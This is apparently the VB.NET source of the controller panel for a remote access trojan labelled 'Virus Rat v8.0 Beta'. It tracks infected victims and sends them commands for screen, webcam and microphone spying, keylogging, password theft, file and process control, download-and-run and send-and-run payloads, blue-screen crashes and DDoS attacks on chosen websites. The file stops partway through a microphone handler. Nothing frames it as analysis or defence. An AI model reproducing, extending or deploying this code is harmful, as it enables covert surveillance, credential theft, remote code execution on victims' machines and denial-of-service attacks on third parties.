Imports System.IO
Public Class Form1
    Private lvwColumnSorter As ListViewColumnSorter
    Public WithEvents S As SocketServer
    Public Yy As String = "|BawaneH|"
    Dim ProportionsArray() As CtrlProportions
    Public Sz As Size
    Public tictoc As Integer = 0
    Public pw As String = "jordan"
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
            Case 14
                zs.Width = zs.Width / 7
                zs.Height = zs.Height / 7
            Case 15
                zs.Width = zs.Width / 8
                zs.Height = zs.Height / 8
            Case 16
                zs.Width = zs.Width / 9
                zs.Height = zs.Height / 9
            Case 17
                zs.Width = zs.Width / 10
                zs.Height = zs.Height / 10

        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        NotifyIcon1.Dispose()
        End
    End Sub
    Private Sub Form1_HandleCreated(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.HandleCreated

        Informload()

    End Sub
    Private Structure CtrlProportions
        Dim HeightProportions As Single
        Dim WidthProportions As Single
        Dim TopProportions As Single
        Dim LeftProportions As Single
    End Structure

    Sub Informload()

        On Error Resume Next

        Application.DoEvents()

        ReDim ProportionsArray(0 To Controls.Count - 1)

        For I As Integer = 0 To Controls.Count - 1

            With ProportionsArray(I)
                .HeightProportions = Controls(I).Height / Height
                .WidthProportions = Controls(I).Width / Width
                .TopProportions = Controls(I).Top / Height
                .LeftProportions = Controls(I).Left / Width

            End With
        Next

    End Sub

    Public Sub Resizeform()

        On Error Resume Next

        For I As Integer = 0 To Controls.Count - 1

            Controls(I).Left = ProportionsArray(I).LeftProportions * Me.Width
            Controls(I).Top = ProportionsArray(I).TopProportions * Me.Height
            Controls(I).Width = ProportionsArray(I).WidthProportions * Me.Width
            Controls(I).Height = ProportionsArray(I).HeightProportions * Me.Height
        Next

    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Download") And My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/Voice") Then

        Else
            My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "/Download")
        End If
        Control.CheckForIllegalCrossThreadCalls = False
        Timer1.Start()
        NotifyIcon1.Icon = Me.Icon
        S = New SocketServer
        Dim po As String = InputBox("Port", "New Port")
        S.Start(po)
    End Sub
#Region "Server Events"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            L1.Items(sock.ToString).Remove()
        Catch ex As Exception
        End Try


    End Sub
    Sub Connected(ByVal sock As Integer) Handles S.Connected

        S.Send(sock, "info" & Yy & pw) ' i ask him to send me PC name


    End Sub
    Delegate Sub _Datad(ByVal info As Data)
    Sub data(ByVal info As Data) Handles S.Datad
        Dim a As String = info.GetData
        Dim aa As String() = a.Split("|")
        Select Case aa(0)
            Case "tt"
                MsgBox("hhhhhhhhhhhhhhhhhhhhhhhh")
        End Select

    End Sub
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)

                Case "downloadtherec"
                    IO.File.WriteAllBytes(Application.StartupPath & "\Download\Sound" & tictoc & ".wav", Convert.FromBase64String(A(1)))
                    My.Computer.Audio.Play(Application.StartupPath & "\Download\Sound" & tictoc & ".wav", AudioPlayMode.WaitToComplete)

                Case "requestrecords"
                    If My.Application.OpenForms("Microphone" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Microphone
                    fm.sock = sock
                    fm.Name = "Microphone" & sock
                    fm.Text = fm.Text & " " & S.IP(sock)
                    fm.Show()
                    While My.Computer.FileSystem.FileExists(Application.StartupPath & "\Download" & tictoc & ".wav")
                        tictoc = tictoc + 1
                    End While

                Case "camlist"
                    Dim f As Form12 = My.Application.OpenForms("cam" & sock)
                    If f Is Nothing Then
                        If Me.InvokeRequired Then
                            Me.Invoke(New _Data(AddressOf data), New Object() {sock, B})
                            Exit Sub
                        End If
                        f = New Form12
                        f.Name = "cam" & sock
                        f.sock = sock
                        For i As Integer = 1 To A.Length - 1
                            f.ComboBox1.Items.Add(A(i))
                        Next
                        f.Show()

                    End If
                Case "cam"
                    Dim f As Form12 = My.Application.OpenForms("cam" & sock)
                    If f IsNot Nothing Then
                        If A.Length = 2 Then
                            Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                            SyncLock f.PictureBox1
                                f.PictureBox1.Image = Image.FromStream(m)
                            End SyncLock
                        End If
                    End If

                Case "info" ' Client Sent me PC name

                    Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3))))
                    L.SubItems.Add(S.IP(sock))
                    L.SubItems.Add(A(2))
                    L.SubItems.Add(A(3))
                    L.SubItems.Add(A(4))
                    L.SubItems.Add(A(5))
                    L.SubItems.Add(" ")
                    L.SubItems.Add(A(6))

                    L.ToolTipText = sock

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                    NotifyIcon1.BalloonTipTitle = "Virus Rat v8.0 Beta"
                    NotifyIcon1.BalloonTipText = "[ Name : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
                    Beep()
                    NotifyIcon1.ShowBalloonTip(1)
                Case "SP"
                    MsgBox("OK", MsgBoxStyle.Information)
                Case "Block"
                    MsgBox("The Web Has Block", MsgBoxStyle.Information)
                Case "AW"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).SubItems(6).Text = A(1)
                            Exit For
                        End If
                    Next

                Case "downloadedfile"
                    IO.File.WriteAllBytes(Application.StartupPath & "\Download\" & A(2), Convert.FromBase64String(A(1)))
                    Threading.Thread.CurrentThread.Sleep(1000)

                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
                Case "||||"
                    If My.Application.OpenForms("||||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Form3
                    f.sock = sock
                    f.Name = "||||" & sock
                    f.Text = f.Text & S.IP(sock)
                    f.Show()
                Case "openlo"
                    If My.Application.OpenForms("openlo" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Form7
                    f.sock = sock
                    f.Name = "openlo" & sock
                    f.Text = f.Text & S.IP(sock)
                    f.Show()
                    ' Case "logf"
                    '    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
                    '   Dim logsf As String() = Split(A(1), "|")
                    '  For i As Integer = 0 To logsf.Length - 2
                    'Dim ii As New ListViewItem
                    'ii.Text = logsf(i)
                    'f.ListView1.Items.Add(ii)
                    'Next
                Case "getlog"
                    Dim F As Form7 = My.Application.OpenForms("openlo" & sock)
                    F.TextBox1.Text = A(1)
                Case "|||"
                    If My.Application.OpenForms("|||" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Man
                    fm.sock = sock
                    fm.Name = "|||" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.Show()
                Case "fun"
                    If My.Application.OpenForms("fun" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Form9
                    fm.sock = sock
                    fm.Name = "fun" & sock
                    fm.Text = fm.Text & S.IP(sock)
                    fm.f = Me
                    fm.Show()
                Case "++"
                    If My.Application.OpenForms("++" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim fm As New Form4
                    fm.sock = sock
                    fm.Name = "++" & sock
                    fm.Text = "password -" & S.IP(sock)
                    fm.Show()
                    S.Send(sock, "ppww")
                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If My.Application.OpenForms("!" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Cap
                    f.F = Me
                    f.Sock = sock
                    f.Name = "!" & sock
                    f.Sz = New Size(A(1), A(2))
                    f.Show()
                Case "!!" ' i recive size of client screen
                    c1.Items.Clear()
                    c2.Items.Clear()
                    Sz = New Size(A(1), A(2))
                    For i As Integer = 0 To 17
                        c1.Items.Add(QZ(i))
                    Next
                    For i As Integer = 1 To 10
                        c2.Items.Add(i)
                    Next
                    P1.Image = New Bitmap(Sz.Width, Sz.Height)
                    c1.SelectedIndex = 17
                    c2.SelectedIndex = 9

                    If CheckBox2.Checked = False Then c2.SelectedIndex = 0
                    S.Send(sock, "@@" & Yy & c1.SelectedIndex & Yy & c2.Text & Yy & c.Value)
                Case "@" ' i recive image  
                    Dim F As Cap = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            F.Text = "Remote Desktop  " & "Size: " & siz(B.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                S.Send(sock, "@" & Yy & F.C1.SelectedIndex & Yy & F.C2.Text & Yy & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(B, "@" & Yy)(1)
                        F.PktToImage(BB)
                    End If
                Case "@@" ' i recive image  

                    Dim BB As Byte() = fx(B, "@@" & Yy)(1)

                    PktToImage(BB)
                Case "opentto"
                    If My.Application.OpenForms("opentto" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim f As New Form10

                    f.sock = sock
                    f.Name = "opentto" & sock
                    f.Text = f.Text + S.IP(sock)
                    f.Show()

                Case "Text"
                    Dim fff As Man = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                        fff.BackToolStripMenuItem.PerformClick()
                    Else
                        fff.TextBox2.Text = A(1)

                    End If

                Case "viewimage"
                    Dim fff As Man = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                        fff.BackToolStripMenuItem.PerformClick()
                    Else
                        Dim picbyte() As Byte = Convert.FromBase64String(A(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.pic1.Image = Image.FromStream(ms)
                    End If



                Case "FileManager"
                    Dim fff As Man = My.Application.OpenForms("|||" & sock)
                    If A(1) = "Error" Then
                        fff.BackToolStripMenuItem.PerformClick()
                    Else
                        fff.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".wav") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 13
                            Else
                                itm.ImageIndex = 8
                            End If
                            fff.ListView1.Items.Add(itm)
                            i += 1
                        Next
                    End If
                Case "ProcessManager"
                    Dim f As Form3 = My.Application.OpenForms("||||" & sock)
                    Dim allProcess As String() = Split(A(1), "ProcessSplit") 'Message.Substring(15).Split("ProcessSplit")
                    For i = 0 To allProcess.Length - 2
                        Dim itm As New ListViewItem
                        itm.Text = allProcess(i)
                        itm.SubItems.Add(allProcess(i + 1))
                        itm.SubItems.Add(allProcess(i + 2))
                        itm.SubItems.Add(allProcess(i + 3))
                        itm.ImageIndex = 0
                        f.ListView1.Items.Add(itm)
                        i += 3
                    Next
                Case "ppww"
                    Dim f As Form4 = My.Application.OpenForms("++" & sock)
                    Dim aa As String() = Split(A(1), "|")

                    Try
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.ImageIndex = 0
                            f.ListView1.Items.Add(ii)
                            i += 5

                        Next
                    Catch ex As Exception
                    End Try

            End Select
        Catch ex As Exception
            '  MsgBox(ex.Message)
        End Try

    End Sub
#End Region


    Private Sub L1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub CloseToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "close")
        Next
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs)
        ' Determine if the clicked column is already the column that is 
        ' being sorted.
        Try


            If (e.Column = lvwColumnSorter.SortColumn) Then
                ' Reverse the current sort direction for this column.
                If (lvwColumnSorter.Order = SortOrder.Ascending) Then
                    lvwColumnSorter.Order = SortOrder.Descending
                Else
                    lvwColumnSorter.Order = SortOrder.Ascending
                End If
            Else
                ' Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column
                lvwColumnSorter.Order = SortOrder.Ascending
            End If

            ' Perform the sort with these new sort options.
            Me.L1.Sort()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub L1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub L1_SelectedIndexChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub RemoteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Logoff")
        Next
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Restart")
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Shutdown")
        Next
    End Sub

    Private Sub RemoteFileMangerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteFileMangerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "|||") ' file manger
        Next
    End Sub




    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "||||") ' process 
        Next
    End Sub

    Private Sub FindPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FindPasswordToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "++")
        Next
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.Text = "Virus Rat v8.0 Beta" & " Online Virus : " & L1.Items.Count
    End Sub
    Private Sub Form1_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        Resizeform()
        If WindowState = FormWindowState.Minimized Then
            ShowIcon = False
            ShowInTaskbar = False
            Me.Hide()
            NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
            NotifyIcon1.BalloonTipTitle = "Virus Rat v7.0"
            NotifyIcon1.BalloonTipText = "Virus online [ x ]".Replace("x", L1.Items.Count)
            NotifyIcon1.ShowBalloonTip(1000)
        Else

        End If
    End Sub

    Private Sub SdfghToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SdfghToolStripMenuItem.Click
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Uninstall")
        Next
    End Sub

    Private Sub CreatServerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Form5.Show()
    End Sub

    Private Sub AboutToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub FfffffffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "opencam")
        Next
    End Sub
    Public Sub PktToImage(ByVal BY As Byte())
        If CheckBox2.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "@@" & Yy & c1.SelectedIndex & Yy & c2.Text & Yy & c.Value)
                End If
            Next
        End If

        Dim B As Array = fx(BY, "njq8")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")
        'Me.Text = "Remote Desktop  " & "Size: " & siz(BY.LongLength) & " ,Changes: " & QQ.Length - 2
        Dim K As Bitmap = P1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))

            tp += SZ.Height
        Next
        G.Dispose()
        P1.Image = K
    End Sub

    Private Sub L1_SelectedIndexChanged_3(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles L1.SelectedIndexChanged
        If CheckBox1.Checked Then
            For Each x As ListViewItem In L1.SelectedItems
                If L1.SelectedItems.Count = 1 Then
                    S.Send(x.ToolTipText, "!!")
                End If
            Next

        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Form2.Show()
    End Sub

    Private Sub RemoteKayloggerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteKayloggerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openlo")
        Next
    End Sub

    Private Sub TextToSpechToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextToSpechToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "opentto")
        Next
    End Sub

    Private Sub FunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FunToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "fun")
        Next
    End Sub

    Private Sub SendFileAndRunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendFileAndRunToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        If o.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.ToolTipText, "sendfile" & "|BawaneH|" & n.Name & "|BawaneH|" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        End If
    End Sub

    Private Sub OpenWebSiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenWebSiteToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        If c = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "openurl" & "|BawaneH|" & c)
            Next
        End If
    End Sub

    Private Sub OpenFolderDowloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenFolderDowloadToolStripMenuItem.Click
        System.Diagnostics.Process.Start(Application.StartupPath & "/Download")
    End Sub

    Private Sub Button2_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Form5.Show()
    End Sub

    Private Sub StartProToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartProToolStripMenuItem.Click
        Dim name As String = InputBox("ProcessName", "Process Name")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems

                S.Send(x.ToolTipText, "newpr" & "|BawaneH|" & name)
            Next
        End If
       
    End Sub

    Private Sub BloacToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BloacToolStripMenuItem.Click
        
    End Sub

    Private Sub FirefoxToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FirefoxToolStripMenuItem.Click
        Dim name As String = InputBox("WebName", "Name", "Youtube")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems

                S.Send(x.ToolTipText, "blockF" & "|BawaneH|" & name)
            Next
        End If
       
    End Sub

    Private Sub ChromeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ChromeToolStripMenuItem.Click
        Dim name As String = InputBox("WebName", "Name", "Youtube")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems

                S.Send(x.ToolTipText, "blockC" & "|BawaneH|" & name)
            Next
        End If
       
    End Sub

    Private Sub RemaeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemaeToolStripMenuItem.Click

        Dim name As String = InputBox("New Name", "Name", "Mr.Mobark")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "Ren" & "|BawaneH|" & name)
            Next

        End If
       
    End Sub

    Private Sub SendToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SendToolStripMenuItem.Click
        Dim name As String = InputBox("New Host", "Host")
        Dim p As String = InputBox("Port", "Port")

        If name = "" And p = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "Host" & "|BawaneH|" & name & "|BawaneH|" & p)
            Next
        End If
       
    End Sub

    Private Sub FolderSpreadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ShowBlueScreenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ShowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Zom")
        Next
    End Sub
    Private Sub DDOSAttackToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DDOSAttackToolStripMenuItem.Click
        Dim w As String = InputBox("The Web site", "DDOS ATTACK")
        Dim speed As String = InputBox("Attack Speed", "10000 Or 12000 Or 8000 Or 15000")
        If w = "" Then
            MsgBox("eroor", MsgBoxStyle.Critical)
        Else

            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "att" & Yy & w & Yy & speed)
            Next
        End If
    End Sub

    Private Sub RemoteCamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteCamToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "camlist")
        Next
    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged

    End Sub

    Private Sub BackToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BackToolStripMenuItem.Click
        Dim cc As New ColorDialog
        cc.ShowDialog()
        L1.BackColor = cc.Color
    End Sub

    Private Sub VirusColorToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VirusColorToolStripMenuItem.Click
        Dim cc As New ColorDialog
        cc.ShowDialog()
        L1.ForeColor = cc.Color
    End Sub

    Private Sub BlueScreenRestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlueScreenRestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Scb")
        Next
    End Sub

    Private Sub DownloadAndRunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DownloadAndRunToolStripMenuItem.Click
        Dim name As String = InputBox("Url", "Url")
        Dim p As String = InputBox(" Full File Name", "File Name")

        If name = "" And p = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "D+r" & "|BawaneH|" & name & "|BawaneH|" & p)
            Next
        End If
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MicrophoneToolStripMenuItem.Click
